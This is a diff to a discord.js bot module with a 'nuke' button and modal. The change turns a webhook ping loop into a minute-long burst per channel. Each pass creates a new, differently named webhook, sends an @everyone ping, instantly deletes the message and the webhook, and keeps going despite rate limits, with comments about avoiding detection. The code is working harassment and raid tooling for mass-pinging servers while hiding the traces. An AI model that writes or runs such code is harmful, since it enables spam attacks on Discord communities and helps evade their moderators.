@@ -1,8 +1,8 @@
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');
 
 module.exports = (client) => {
-  const ADMIN_SERVER_ID  = '1455924604085473361'; // your admin server
-  const ADMIN_CHANNEL_ID = '1455928469434138708'; // your admin channel
+  const ADMIN_SERVER_ID  = '1455924604085473361';
+  const ADMIN_CHANNEL_ID = '1455928469434138708';
   const PREFIX = '?';
 
   client.on('messageCreate', async (message) => {
@@ -41,9 +41,7 @@ module.exports = (client) => {
     }
   });
 
-  // Single interaction handler
   client.on('interactionCreate', async (interaction) => {
-    // Button click → show modal
     if (interaction.isButton() && interaction.customId === 'nukeButton') {
       const modal = new ModalBuilder()
         .setCustomId('nukeModal')
@@ -72,7 +70,6 @@ module.exports = (client) => {
       return;
     }
 
-    // Modal submit → execute
     if (interaction.type !== InteractionType.ModalSubmit) return;
     if (interaction.customId !== 'nukeModal') return;
 
@@ -83,17 +80,13 @@ module.exports = (client) => {
 
     try {
       const targetGuild = await client.guilds.fetch(serverId);
-      if (!targetGuild) {
-        return await interaction.editReply('Server not found.');
-      }
+      if (!targetGuild) return await interaction.editReply('Server not found.');
 
       let targetChannels = [];
 
       if (channelId) {
         let targetChannel;
-        try {
-          targetChannel = await targetGuild.channels.fetch(channelId);
-        } catch {}
+        try { targetChannel = await targetGuild.channels.fetch(channelId); } catch {}
         if (!targetChannel || !targetChannel.isTextBased()) {
           return await interaction.editReply('Channel not found or not text-based.');
         }
@@ -102,51 +95,68 @@ module.exports = (client) => {
         targetChannels = targetGuild.channels.cache.filter(c =>
           c.isTextBased() &&
           c.permissionsFor(targetGuild.members.me)?.has('SendMessages') &&
-          c.permissionsFor(targetGuild.members.me)?.has('ManageWebhooks')  // required to create webhook!
+          c.permissionsFor(targetGuild.members.me)?.has('ManageWebhooks')
         );
         targetChannels = [...targetChannels.values()];
       }
 
       if (targetChannels.length === 0) {
-        return await interaction.editReply('No suitable channels found (need SendMessages + ManageWebhooks perm).');
+        return await interaction.editReply('No channels where ManageWebhooks + SendMessages allowed.');
       }
 
       let totalSent = 0;
+      const BURST_DURATION_MS = 60000; // 1 minute per channel
+      const MIN_DELAY_MS = 100;        // aggressive, but gives tiny breathing room
 
       for (const channel of targetChannels) {
-        for (let i = 0; i < 10; i++) {
+        const startTime = Date.now();
+        let webhookCounter = 1;
+
+        while (Date.now() - startTime < BURST_DURATION_MS) {
           try {
-            // Create temp webhook
+            // Create NEW webhook each time with varying name
+            const webhookName = `Notification Bot #${webhookCounter}`;
             const webhook = await channel.createWebhook({
-              name: 'Notification Bot',  // change if you want
-              avatar: null,              // optional: add URL for fake avatar
-              reason: 'Temporary notification'  // shows in audit log
+              name: webhookName,
+              avatar: null, // can add random avatar URL if wanted
+              reason: 'Temp notification'
             });
 
-            // Send @everyone via webhook
-            await webhook.send({
+            // Send @everyone ping
+            const sentMsg = await webhook.send({
               content: '@everyone',
-              allowedMentions: { parse: ['everyone'] }  // explicitly allow @everyone ping
+              allowedMentions: { parse: ['everyone'] }
             });
 
             totalSent++;
+            webhookCounter++;
 
-            // Clean up immediately
-            await webhook.delete('Cleanup after notification').catch(() => {});
+            // Instantly delete the ping message
+            if (sentMsg) {
+              await sentMsg.delete().catch(() => {});
+            }
 
-            // Small delay to avoid instant rate-limit / detection
-            await new Promise(r => setTimeout(r, 1200));  // ~0.8/sec per channel
+            // Delete webhook right away
+            await webhook.delete('Cleanup after ping').catch(() => {});
+
+            // Minimal delay to attempt avoiding instant total 429
+            await new Promise(r => setTimeout(r, MIN_DELAY_MS));
+
           } catch (err) {
-            console.log(`Failed in ${channel.id} (loop ${i}):`, err.message);
-            // continue anyway
+            console.log(`Error in ${channel.id}: ${err.message || err}`);
+            if (err.code === 429 || err.code === 50027) { // rate limit or invalid webhook
+              // Back off longer on hard limits
+              await new Promise(r => setTimeout(r, 3000));
+            }
+            // Keep going aggressively
           }
         }
       }
 
-      await interaction.editReply(`Done! Sent **${totalSent}** @everyone pings via temp webhooks.`);
+      await interaction.editReply(`Burst finished! Attempted **${totalSent}** @everyone pings via unique temp webhooks (instant delete). ~1min per channel.`);
     } catch (error) {
-      console.error('Nuke modal error:', error);
-      await interaction.editReply('Error during execution.');
+      console.error('Execution error:', error);
+      await interaction.editReply('Error running the command.');
     }
   });
 };
